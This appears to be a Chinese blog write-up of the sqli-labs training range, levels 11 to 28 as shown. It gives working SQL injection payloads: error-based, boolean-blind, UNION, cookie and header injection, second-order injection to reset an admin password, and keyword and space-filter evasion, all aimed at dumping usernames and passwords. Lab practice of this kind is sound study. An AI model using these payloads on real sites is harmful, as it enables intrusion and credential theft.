<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>sql-labs靶场练习 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="sql-labs靶场练习" />
<meta property="og:description" content="目录
less-11
less-12
less-13
less-14
less-15
less-16
less-17
less-18
less-19
less-20
less-21
less-22
less-23
less-24
less-25
less-25a
less-26
less-26a
less-27
less-27a
less-28
less-28a
less-29
less-30
less-31
less-32
less-33
less-34
less-35
less-36
less-37
less-38
less-39
less-40
less-41
less-42
less-43
less-44
less-45
less-46
less-47
less-48
less-49
less-50
less-51
less-52
less-53
less-54
less-55
less-56
less-57
less-58
less-59
less-60
less-61
less-62
less-63
less-64
less-65
less-11 这一关开始发现是post传参，是在输入框中输入，但总体思路不变
一般POST型使用1&#39; or 1=1 -- #和1&#34; or 1=1 -- # 来判断闭合方式，成功的概率最大因单双引号引起的闭合问题更大点" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/0a0558f24fcd6e2059558def59562369/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-04T01:54:33+08:00" />
<meta property="article:modified_time" content="2023-03-04T01:54:33+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">sql-labs靶场练习</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="-toc" style="margin-left:80px;"></p> 
<p id="less-11-toc" style="margin-left:80px;"><a href="#less-11" rel="nofollow">less-11</a></p> 
<p id="%C2%A0less-12-toc" style="margin-left:80px;"><a href="#%C2%A0less-12" rel="nofollow"> less-12</a></p> 
<p id="less-13-toc" style="margin-left:80px;"><a href="#less-13" rel="nofollow">less-13</a></p> 
<p id="less-14-toc" style="margin-left:80px;"><a href="#less-14" rel="nofollow">less-14</a></p> 
<p id="less-15-toc" style="margin-left:80px;"><a href="#less-15" rel="nofollow">less-15</a></p> 
<p id="less-16-toc" style="margin-left:80px;"><a href="#less-16" rel="nofollow">less-16</a></p> 
<p id="less-17-toc" style="margin-left:80px;"><a href="#less-17" rel="nofollow">less-17</a></p> 
<p id="%C2%A0less-18-toc" style="margin-left:80px;"><a href="#%C2%A0less-18" rel="nofollow"> less-18</a></p> 
<p id="less-19-toc" style="margin-left:80px;"><a href="#less-19" rel="nofollow">less-19</a></p> 
<p id="less-20-toc" style="margin-left:80px;"><a href="#less-20" rel="nofollow">less-20</a></p> 
<p id="%C2%A0less-21-toc" style="margin-left:80px;"><a href="#%C2%A0less-21" rel="nofollow"> less-21</a></p> 
<p id="less-22-toc" style="margin-left:40px;"><a href="#less-22" rel="nofollow">less-22</a></p> 
<p id="%C2%A0less-23-toc" style="margin-left:40px;"><a href="#%C2%A0less-23" rel="nofollow"> less-23</a></p> 
<p id="less-24-toc" style="margin-left:40px;"><a href="#less-24" rel="nofollow">less-24</a></p> 
<p id="%C2%A0less-25-toc" style="margin-left:40px;"><a href="#%C2%A0less-25" rel="nofollow"> less-25</a></p> 
<p id="less-25a-toc" style="margin-left:40px;"><a href="#less-25a" rel="nofollow">less-25a</a></p> 
<p id="less-26-toc" style="margin-left:40px;"><a href="#less-26" rel="nofollow">less-26</a></p> 
<p id="less-26a-toc" style="margin-left:40px;"><a href="#less-26a" rel="nofollow">less-26a</a></p> 
<p id="less-27-toc" style="margin-left:40px;"><a href="#less-27" rel="nofollow">less-27</a></p> 
<p id="less-27a-toc" style="margin-left:40px;"><a href="#less-27a" rel="nofollow">less-27a</a></p> 
<p id="less-28-toc" style="margin-left:40px;"><a href="#less-28" rel="nofollow">less-28</a></p> 
<p id="less-28a-toc" style="margin-left:40px;"><a href="#less-28a" rel="nofollow">less-28a</a></p> 
<p id="less-29-toc" style="margin-left:40px;"><a href="#less-29" rel="nofollow">less-29</a></p> 
<p id="less-30-toc" style="margin-left:0px;"><a href="#less-30" rel="nofollow">less-30</a></p> 
<p id="%C2%A0less-31-toc" style="margin-left:40px;"><a href="#%C2%A0less-31" rel="nofollow"> less-31</a></p> 
<p id="%C2%A0less-32-toc" style="margin-left:40px;"><a href="#%C2%A0less-32" rel="nofollow"> less-32</a></p> 
<p id="less-33-toc" style="margin-left:40px;"><a href="#less-33" rel="nofollow">less-33</a></p> 
<p id="%C2%A0less-34-toc" style="margin-left:40px;"><a href="#%C2%A0less-34" rel="nofollow"> less-34</a></p> 
<p id="%C2%A0less-35-toc" style="margin-left:40px;"><a href="#%C2%A0less-35" rel="nofollow"> less-35</a></p> 
<p id="%C2%A0less-36-toc" style="margin-left:40px;"><a href="#%C2%A0less-36" rel="nofollow"> less-36</a></p> 
<p id="%C2%A0less-37-toc" style="margin-left:40px;"><a href="#%C2%A0less-37" rel="nofollow"> less-37</a></p> 
<p id="%C2%A0less-38-toc" style="margin-left:40px;"><a href="#%C2%A0less-38" rel="nofollow"> less-38</a></p> 
<p id="%C2%A0less-39-toc" style="margin-left:40px;"><a href="#%C2%A0less-39" rel="nofollow"> less-39</a></p> 
<p id="less-40-toc" style="margin-left:40px;"><a href="#less-40" rel="nofollow">less-40</a></p> 
<p id="%C2%A0less-41-toc" style="margin-left:40px;"><a href="#%C2%A0less-41" rel="nofollow"> less-41</a></p> 
<p id="less-42-toc" style="margin-left:40px;"><a href="#less-42" rel="nofollow">less-42</a></p> 
<p id="%C2%A0less-43-toc" style="margin-left:40px;"><a href="#%C2%A0less-43" rel="nofollow"> less-43</a></p> 
<p id="less-44-toc" style="margin-left:40px;"><a href="#less-44" rel="nofollow">less-44</a></p> 
<p id="%C2%A0less-45-toc" style="margin-left:40px;"><a href="#%C2%A0less-45" rel="nofollow"> less-45</a></p> 
<p id="less-46-toc" style="margin-left:40px;"><a href="#less-46" rel="nofollow">less-46</a></p> 
<p id="%C2%A0less-47-toc" style="margin-left:40px;"><a href="#%C2%A0less-47" rel="nofollow"> less-47</a></p> 
<p id="%C2%A0less-48-toc" style="margin-left:40px;"><a href="#%C2%A0less-48" rel="nofollow"> less-48</a></p> 
<p id="less-49-toc" style="margin-left:40px;"><a href="#less-49" rel="nofollow">less-49</a></p> 
<p id="less-50-toc" style="margin-left:40px;"><a href="#less-50" rel="nofollow">less-50</a></p> 
<p id="%C2%A0less-51-toc" style="margin-left:40px;"><a href="#%C2%A0less-51" rel="nofollow"> less-51</a></p> 
<p id="%C2%A0less-52-toc" style="margin-left:40px;"><a href="#%C2%A0less-52" rel="nofollow"> less-52</a></p> 
<p id="%C2%A0less-53-toc" style="margin-left:40px;"><a href="#%C2%A0less-53" rel="nofollow"> less-53</a></p> 
<p id="less-54-toc" style="margin-left:40px;"><a href="#less-54" rel="nofollow">less-54</a></p> 
<p id="less-55-toc" style="margin-left:40px;"><a href="#less-55" rel="nofollow">less-55</a></p> 
<p id="less-56-toc" style="margin-left:40px;"><a href="#less-56" rel="nofollow">less-56</a></p> 
<p id="less-57-toc" style="margin-left:40px;"><a href="#less-57" rel="nofollow">less-57</a></p> 
<p id="%C2%A0less-58-toc" style="margin-left:40px;"><a href="#%C2%A0less-58" rel="nofollow"> less-58</a></p> 
<p id="%C2%A0less-59-toc" style="margin-left:40px;"><a href="#%C2%A0less-59" rel="nofollow"> less-59</a></p> 
<p id="less-60-toc" style="margin-left:40px;"><a href="#less-60" rel="nofollow">less-60</a></p> 
<p id="less-61-toc" style="margin-left:40px;"><a href="#less-61" rel="nofollow">less-61</a></p> 
<p id="less-62-toc" style="margin-left:40px;"><a href="#less-62" rel="nofollow">less-62</a></p> 
<p id="less-63-toc" style="margin-left:40px;"><a href="#less-63" rel="nofollow">less-63</a></p> 
<p id="less-64-toc" style="margin-left:40px;"><a href="#less-64" rel="nofollow">less-64</a></p> 
<p id="less-65-toc" style="margin-left:40px;"><a href="#less-65" rel="nofollow">less-65</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h4 id="less-11">less-11</h4> 
<p><strong>这一关开始发现是post传参，是在输入框中输入，但总体思路不变</strong></p> 
<p><strong>一般POST型使用1' or 1=1 -- #和1" or 1=1 -- # 来判断闭合方式，成功的概率最大因单双引号引起的闭合问题更大点</strong></p> 
<p><strong>判断注入类型发现是字符型</strong></p> 
<p><strong>判断闭合方式（发现是单引号闭合）</strong></p> 
<p><img alt="" height="241" src="https://images2.imgbox.com/96/de/L7RWkRJT_o.png" width="727"></p> 
<p><strong>判断字段数（发现是两列）</strong></p> 
<p><strong>判断回显位（发现两列均可以回显）</strong></p> 
<p><img alt="" height="207" src="https://images2.imgbox.com/2a/5d/DcMy1WBy_o.png" width="362"></p> 
<p><strong> 判断数据库名</strong></p> 
<p><img alt="" height="138" src="https://images2.imgbox.com/79/b8/J5MRiN9x_o.png" width="380"></p> 
<p><strong> 爆出表名</strong></p> 
<p><img alt="" height="161" src="https://images2.imgbox.com/05/f6/6MUtAnI4_o.png" width="712"></p> 
<p><strong> 爆出列名</strong></p> 
<p><img alt="" height="159" src="https://images2.imgbox.com/8d/87/Tk25EHD3_o.png" width="1200"></p> 
<p><strong> 爆出用户名和密码</strong></p> 
<p><img alt="" height="190" src="https://images2.imgbox.com/c8/a3/qRreHJTN_o.png" width="1200"></p> 
<h4 id="%C2%A0less-12"> less-12</h4> 
<p><strong>采用“1\”直接爆出闭合方式为：（" ")</strong></p> 
<p><img alt="" height="167" src="https://images2.imgbox.com/70/b9/qV0npKak_o.png" width="593"></p> 
<p><strong>判断字段数（发现是两列）</strong></p> 
<p><strong>如图是回显位</strong></p> 
<p><img alt="" height="131" src="https://images2.imgbox.com/0f/30/HSla8dLM_o.png" width="417"></p> 
<p><strong>爆出数据库名,语句和lese-1一样，闭合方式换换就可以了</strong></p> 
<h4 id="less-13"><strong>less-13</strong></h4> 
<p><strong>这关只有登录成功与失败，并且有报错信息的显示，但是没有回显，因此我们应该采用报错注入</strong></p> 
<p><img alt="" height="125" src="https://images2.imgbox.com/da/ba/bk8YWV3n_o.png" width="553"></p> 
<p><strong> 这里我用updatexml函数</strong></p> 
<p><strong>爆数据库名</strong></p> 
<pre><code>1') and updatexml(1,concat('~',(select database())),3)#</code></pre> 
<p><img alt="" height="140" src="https://images2.imgbox.com/77/40/ZbO2CP9Y_o.png" width="461"></p> 
<p><strong> 爆表名</strong></p> 
<pre><code>1') and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3)#</code></pre> 
<p><img alt="" height="137" src="https://images2.imgbox.com/58/14/1ZtyIOWl_o.png" width="781"></p> 
<p><strong> 爆列名（由于报错注入默认只能返回32个字符，因此我们采用substring来解决）</strong></p> 
<pre><code>1') and updatexml(1,concat(0x7e,(select substring(group_concat(column_name),25,30) from information_schema.columns where table_name='users')),0x7e)#</code></pre> 
<p><img alt="" height="133" src="https://images2.imgbox.com/ed/64/AtWILU07_o.png" width="767"></p> 
<p><strong> 爆用户名和密码</strong></p> 
<pre><code>1') and updatexml(1,concat(0x7e,(select substring(group_concat(username,0x7e,password),25,30) from users)),0x7e)#</code></pre> 
<p><img alt="" height="90" src="https://images2.imgbox.com/25/73/D3H80iOT_o.png" width="789"></p> 
<h4 id="less-14">less-14</h4> 
<p><strong>这一关只是闭合方式为双引号闭合，剩下与上一关一样</strong></p> 
<h4 id="less-15"><strong>less-15</strong></h4> 
<p><strong>闭合方式为单引号闭合，但由于只有错误与正确的页面显示，因此我们用布尔盲注</strong></p> 
<pre><code>//用or的原因，是我们不知道用户名(知道的话当然可以将1换成用户名)，如果用and，用户名不对，返回的结果就是false，但or的话会返回true

1' or length((select database()))=8#    //判断数据库名字长度

1' or ascii(substr((select database()),1,1))=115# //判断数据库名

1' or (select count(table_name) from information_schema.tables where table_schema=database())=4#  //判断表的个数

1' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117# //判断表的名字

1' or (select count(column_name) from information_schema.columns where table_name='users')=14# //判断列的个数

1' or ascii(substr((select column_name from information_schema.columns where table_name='users' limit 12,1),1,1))=117# //判断列的名字

1' or (select count(username) from users)=13#  //判断用户名和密码的个数

1' or ascii(substr((select username from users limit 0,1),1,1))=68# //判断用户名和密码</code></pre> 
<h4 id="less-16">less-16</h4> 
<p><strong>这一关只是闭合方式为双引号+括号，其他与上一关一致</strong></p> 
<h4 id="less-17"><strong>less-17</strong></h4> 
<p><strong>由于这一关是当我们输入的用户名正确时才会执行下一步，因此我们只能用报错注入</strong></p> 
<pre><code class="language-php">//要在用户名处输入admin
1' and updatexml(1,concat(0x7e,(select database())),1)# //爆数据库名

1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)# //爆表名

1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1)# //爆列名</code></pre> 
<p><img alt="" height="145" src="https://images2.imgbox.com/35/4c/WuMkYbaQ_o.png" width="807"></p> 
<p> <img alt="" height="124" src="https://images2.imgbox.com/e8/66/VMdtLJFV_o.png" width="676"></p> 
<p><strong> 由于在爆用户名和密码时发现总是报错，查询发现是原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表，故采用如下语句</strong></p> 
<pre><code class="language-php">1' and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)#  //采用二次查询“将suers换成(select username from users)a”

//由于报错注入只能返回32位字符，因此我们可以采用substr函数或者mid函数
//这里用mid函数
1' and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1)#</code></pre> 
<p><img alt="" height="161" src="https://images2.imgbox.com/98/b9/BjyB1UZm_o.png" width="805"></p> 
<h4 id="%C2%A0less-18"> less-18</h4> 
<p><strong>借鉴资料发现，当我们正确登录页面时，会出现ua内容，因此我们应该在ua上注入（注入点）</strong></p> 
<p><strong>查看源码发现我们输入的参数应该为3个（当然报错信息上也可以看出），且在第三个参数后面要加上单引号+括号，接下来我们抓包进行注入，这里依旧采用报错注入</strong></p> 
<p><strong>如下图可以看出，爆出三个参数address，ua头，用户名</strong></p> 
<p><img alt="" height="171" src="https://images2.imgbox.com/86/eb/9duG5k8E_o.png" width="820"></p> 
<pre><code class="language-php">$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			echo '&lt;font color= "#FFFF00" font size = 3 &gt;';
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
			mysql_query($insert);
			//echo 'Your IP ADDRESS is: ' .$IP;
			echo "&lt;/font&gt;";
			//echo "&lt;br&gt;";
			echo '&lt;font color= "#0000ff" font size = 3 &gt;';			
			echo 'Your User Agent is: ' .$uagent;
			echo "&lt;/font&gt;";
			echo "&lt;br&gt;";
			print_r(mysql_error());			
			echo "&lt;br&gt;&lt;br&gt;";
			echo '&lt;img src="../images/flag.jpg"  /&gt;';
			echo "&lt;br&gt;";</code></pre> 
<pre><code class="language-php">//三个参数：1,2,3)#形式

//也可采用3个参数的方式进行报错，下面的方式也是借鉴大佬的，比如''1''中内部单引号已经起到闭合的作用，所以外部就无作用了，无法闭合，导致语法错误，但'' ''可以成功执行，故采用'' and 1=1 and''的形式

' and updatexml(1,concat(0x7e,database(),0x7e),1) and ' //爆数据库名

-1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1) and ' //爆表名（-1是为让后面可以爆出信息）

-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) and ' //爆列名

-1' and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) and ' //爆字段内容</code></pre> 
<p><img alt="" height="240" src="https://images2.imgbox.com/ad/33/zvVIUvsi_o.png" width="1200"></p> 
<p> <img alt="" height="219" src="https://images2.imgbox.com/3e/05/1IzxPa5t_o.png" width="1065"></p> 
<h4 id="less-19">less-19</h4> 
<p><strong>我们先正确输入用户名和密码看页面反应，可以看到与上一关相似只不过换成了referer回显，因此我们抓包在bp上对referer进行报错注入即可</strong></p> 
<p><img alt="" height="128" src="https://images2.imgbox.com/46/5f/PZna0UlE_o.png" width="719"></p> 
<p><strong> 如图看到只有address，referer回显，因此与上一关不同的是，这关只需两个参数</strong></p> 
<p><strong>我们猜测插入语句为（'address</strong><strong>','referer'）</strong><strong>因此我们采用  1',1)#  的格式报错注入即可</strong><img alt="" height="184" src="https://images2.imgbox.com/46/f2/KS6YrC5m_o.png" width="896"></p> 
<pre><code class="language-php">1',updatexml(1,concat(0x7e,database(),0x7e),1))# //爆数据库名

1',updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),3))# //爆表名

1',updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'),0x7e),3))# //爆列名

1',updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3))# //爆数据
//爆数据的改良版
1',updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3))#
//该语句的username可以更换，limit可以一个一个查询到全部数据</code></pre> 
<h4 id="less-20">less-20</h4> 
<p><strong>这一关之前先了解如下信息</strong></p> 
<p><strong>一、什么是cookie</strong></p> 
<p><strong>cookie 由服务器发送出来并且存储在浏览器上，从而下次这位独一无二的访客又回到该网络服务器时，可从该浏览器读回此信息。这是很有用的，让浏览器记住这位访客的特定信息，如上次访问的位置、花费的时间或用户首选项</strong></p> 
<p><strong>二、cookie注入的原理</strong></p> 
<p><strong>cookie注入的原理和其他SQL注入的原理一样，只不过以前的参数我们使用get或者post方式提交，而cookie注入参数我们使用cookie的方式提交。</strong></p> 
<p><strong>这一关我们在正确登录后会发现你的cookie信息，如下图，这暗含我们应该在cookie上下手，因此我们抓包截取cookie</strong></p> 
<p><img alt="" height="356" src="https://images2.imgbox.com/2b/b3/DV2vSRbq_o.png" width="1200"></p> 
<p><strong> 如下图</strong></p> 
<p> <img alt="" height="342" src="https://images2.imgbox.com/0f/4b/kgaMOWOH_o.png" width="582"></p> 
<p><strong> 在其后面加上单引号发现如下报错（limit 我们用注释符注释掉）</strong></p> 
<p><img alt="" height="158" src="https://images2.imgbox.com/74/32/bxtgHfYc_o.png" width="874"></p> 
<p><strong> 如下图我们在1=1处进行报错注入即可</strong></p> 
<p><img alt="" height="391" src="https://images2.imgbox.com/5a/6f/T22tZVth_o.png" width="1200"></p> 
<p><strong> 类似如下语句不再赘述</strong></p> 
<pre><code class="language-php">uname=Dumb' and updatexml(1,concat(0x7e,database(),0x7e),1)#</code></pre> 
<p><img alt="" height="337" src="https://images2.imgbox.com/9a/23/5YRwOZfs_o.png" width="1200"></p> 
<h4 id="%C2%A0less-21"><strong> less-21</strong></h4> 
<p><strong>这关依旧是cookie注入，但抓包发现是一串字符，查看是base64编码，于是我们同第一关，输入正确语句，进行base64编码即可<span style="color:#fe2c24;">（</span>注意让前面的为-admin1，这样的话前面错误（不占用后面的回显位置），才能回显后面<span style="color:#fe2c24;">）</span></strong></p> 
<p><strong>在用户名后面+单引号时发现报错，发现还得有括号</strong></p> 
<p><img alt="" height="162" src="https://images2.imgbox.com/24/44/5KZfqljg_o.png" width="850"></p> 
<pre><code>-admin') union select 1,2,database()# //进行加密即可
</code></pre> 
<p><strong>剩下不再赘述</strong></p> 
<h3 id="less-22"><strong>less-22</strong></h3> 
<p><strong>抓包在用户名后面+单引号时页面正常，+双引号时页面报错，内容如下，得知闭合方式为双引号闭合,语句同上一关一样</strong></p> 
<p><img alt="" height="207" src="https://images2.imgbox.com/20/3d/3FyeG6YU_o.png" width="950"></p> 
<h3 id="%C2%A0less-23"> less-23</h3> 
<p><strong>发现这一关回到了get请求，如下图闭合方式为单引号闭合，并且过滤符已被过滤 ，参考了大佬的处理方法，如下</strong></p> 
<p><img alt="" height="152" src="https://images2.imgbox.com/88/bc/afgua3Yx_o.png" width="888"></p> 
<pre><code class="language-php">?id=1' or '1'='1
 
这样sql语句就变成 id='1' or '1'='1'
 
 
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or '1'='1
 
 
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' ),3 or '1'='1
 
 
?id=-1' union select 1,(select group_concat(password,username) from users),3 or '1'='1</code></pre> 
<p><strong>不过在判断列数时候不能使用order by 去判断需要用?id=-1' union select 1,2,3,4 or '1'='1通过不停加数字判断最后根据页面显示是三列，且显示位是2号。</strong></p> 
<p><strong>也可以将查询语句放入id字段中</strong></p> 
<pre><code class="language-php">'union select 1,2,3'  //单引号之间放入查询语句即可</code></pre> 
<h3 id="less-24">less-24</h3> 
<p><strong>这一关实际上是二次注入，对此我进行了了解具体参考如下文章</strong></p> 
<p><a href="https://blog.csdn.net/qq_53079406/article/details/125284454?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167550163316800222861734%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167550163316800222861734&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125284454-null-null.142%5Ev73%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev1%5Einsert_chatgpt&amp;utm_term=sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5&amp;spm=1018.2226.3001.4187" title="【SQL注入】二次注入：原理、利用过程_黑色地带(崛起)的博客-CSDN博客_sql注入二次注入">【SQL注入】二次注入：原理、利用过程_黑色地带(崛起)的博客-CSDN博客_sql注入二次注入</a></p> 
<p><img alt="" height="670" src="https://images2.imgbox.com/ac/f9/E1N6vacB_o.png" width="1200"></p> 
<p><strong> 意思就是防御者对输入的恶意数据进行了转义字符的操作，但在数据库里面又将该数据还原了，而在后续调用该恶意数据时未进行检查的操作（默认是安全的），导致调用的时候数据并未转义而执行了（也就是被注入了）</strong></p> 
<p><strong>如下图是二次注入的过程</strong></p> 
<p><img alt="" height="436" src="https://images2.imgbox.com/f6/c4/mx6r74eX_o.png" width="1200"></p> 
<p><strong>比如我们在这关的注册页面操作：账号：admin'#;  密码：123456</strong></p> 
<p><strong>在后续插入时已被转义，因此没有危害。接下来我们利用该注册账号，进行密码的修改；</strong></p> 
<p><strong>由于密码修改的后端在调用sql查询语句时，查询到的依旧是admin'#（因为在数据库中被还原了）</strong></p> 
<p><strong> 但落实到sql语句中是如下情况</strong></p> 
<pre><code class="language-php">登录进去后，此时更改admin'#密码

相当于：

update password=$new where username=admin'#

（admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密）</code></pre> 
<p><strong>也就是更改了admin这一账号的密码（也就是管理员的密码），至此我们成功实现二次注入</strong></p> 
<p><img alt="" height="342" src="https://images2.imgbox.com/90/2d/mUfsVzUz_o.png" width="955"></p> 
<p><img alt="" height="387" src="https://images2.imgbox.com/4c/41/tqb8gW1b_o.png" width="940"></p> 
<p><strong> 在登录页面输入我们更改的账号密码，admin，111111，可以发现成功登陆</strong><img alt="" height="368" src="https://images2.imgbox.com/ab/78/LpI5BqD0_o.png" width="934"></p> 
<p><strong> 至此成功注入</strong><img alt="" height="575" src="https://images2.imgbox.com/d4/c0/a5XtIana_o.png" width="1103"></p> 
<h3 id="%C2%A0less-25"> less-25</h3> 
<p><strong>根据提示该关卡将or与and替换成了空，并且只替换一次，因此我们用双写绕过</strong></p> 
<pre><code class="language-php">//information里面涉及or可以写成infoorrmation。
?id=-1' union select 1,2,group_concat(table_name)from infoorrmation_schema.table. where table_scham=database()--+

//也可以这样写
?id='union select 1,2,3'</code></pre> 
<h3 id="less-25a">less-25a</h3> 
<p><strong>输入id=1返回正常</strong></p> 
<p><strong>输入id=1'返回错误</strong></p> 
<p><strong>输入id=1--+返回正常，说明没有闭合方式（剩下注意双写绕过即可）</strong></p> 
<pre><code class="language-php">?id=-1 union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</code></pre> 
<h3 id="less-26">less-26</h3> 
<p><strong>第二十六关将逻辑运算符，注释符以及空格给过滤了，我们需要使用单引号进行闭合，双写绕过逻辑运算符或者使用&amp;&amp;和||替换</strong></p> 
<p><strong>在这里有一个陌生的符号：\s： 是匹配所有空白符，包括换行，\S 非空白符，不包括换行。也就是说在这里我们无法使用<em>空格</em> ，\s会将其消掉。（在源码里面）</strong></p> 
<pre><code class="language-php">//空格绕过
%09 TAB键（水平）
%0a 新建一行
%0c 新的一页
%0d return功能
%0b TAB键（垂直）
%a0 空格</code></pre> 
<p><strong>这里用()绕过，同时用报错注入（报错注入用的空格少）</strong></p> 
<pre><code class="language-php">?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1))||'0   爆表
 
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security'aandnd(table_name='users')))),1))||'0     爆字段
 
?id=1'||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||'0   爆密码账户

//这里可以采用'0的原因是||（or的含义）
//若是and则应该采用'1'='1的形式，保证这一部分为true

//或者
?id=1'aandnd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))),1))aandnd'0

//至于最后这种语句，我认为应该是报错注入独有的，因为当你 '内容' 两边是错误的时候，回显的报错内容依旧会爆出数据库名等（靠的是报错注入中的updatexml）</code></pre> 
<h3 id="less-26a">less-26a</h3> 
<p><strong>如下图闭合方式为单引号+括号，报错不会有具体信息，因此需要使用联合注入与盲注</strong></p> 
<p><img alt="" height="182" src="https://images2.imgbox.com/91/dd/JocLfOaS_o.png" width="935"></p> 
<pre><code class="language-php">?id=1')anandd(length(database())=8)anandd('1')=('1

?id=1')anandd(substr(database(),1,1)='s')anandd('1')=('1

?id=1')anandd(ascii(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),7,1))=44)anandd('1')=('1

?id=1')anandd(ascii(mid((select(group_concat(username))from(security.users)),1,1))=68)anandd('1')=('1</code></pre> 
<h3 id="less-27">less-27</h3> 
<p><strong>首先写入参数1\，发现报错信息,发现为单引号闭合</strong></p> 
<p><img alt="" height="351" src="https://images2.imgbox.com/74/fa/Y1lhPcqy_o.png" width="1200"></p> 
<p><strong> 文中已经提示我们已经过滤了union与select，因此我们可以双写绕过或者大小写结合</strong></p> 
<p><strong>在此之前我们应该判断还过滤了什么,可以看到如下图，group by两词之间，空格被过滤了</strong></p> 
<p><img alt="" height="225" src="https://images2.imgbox.com/42/63/Xyg1yJiW_o.png" width="666"></p> 
<p><strong> 此关我们用%a0绕过空格（这里的%00为url终止符，即会造成分号后面不在读取，代替注释符）</strong></p> 
<pre><code class="language-php">?id=1'%a0order%a0by%a03;%00


?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(database()))),1))or'0

?id=1'or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1))or'0

?id=-1'||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where((table_name)='users')and(table_schema='security')),0x7e),1)||'1'='1

?id=-1'||updatexml(1,concat(0x7e,(sElect(group_concat(username,0x7e,password))from(users)),0x7e),1)||'1'='1</code></pre> 
<p><img alt="" height="226" src="https://images2.imgbox.com/98/30/3nWEuXX3_o.png" width="857"></p> 
<h3 id="less-27a">less-27a</h3> 
<p><strong>这关为双引号闭合，并且报错注入行不通，我们可以联合注入</strong></p> 
<p><img alt="" height="255" src="https://images2.imgbox.com/39/c2/GlQbNrbd_o.png" width="819"></p> 
<pre><code class="language-php">?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'%0Aand"1

?id=0"uniunionon%0AseleSelectct%0A1,database(),3%0Aand"1

?id=0"uniunionon%0AseleSelectct%0A1,2,3%0Aand"1

?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(table_name)from(information_schema.tables)where(table_schema='security')and"1

?id=0" %0a unioN %0a selecT %0a 1,(group_concat(username)),(group_concat(password)) from (users);%00

?id=0"uniunionon%0AseleSelectct%0A1,2,group_concat(username,id,password)from%0Ausers%0Awhere%0Aid=3%0Aand"1

//记录一下，这一关明明显示回显位是1,2列，为什么在后面的表明，列明查询中，偏偏要放在第三列才能回显呢
//在爆密码时为何不能用一个回显位将其全部回显呢，这些答案都是分开放置或者单独回显，难道是一个回显位会不够吗？</code></pre> 
<h3 id="less-28">less-28</h3> 
<p><strong>闭合方式为(' ')，依旧不能报错注入，过滤了空格，union与select</strong></p> 
